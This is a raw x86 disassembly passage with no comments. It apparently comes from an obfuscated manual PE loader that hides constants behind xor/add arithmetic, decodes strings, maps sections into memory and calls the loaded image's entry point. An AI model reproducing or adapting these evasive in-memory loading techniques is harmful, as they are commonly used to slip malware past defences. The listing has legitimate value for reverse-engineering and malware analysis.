  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
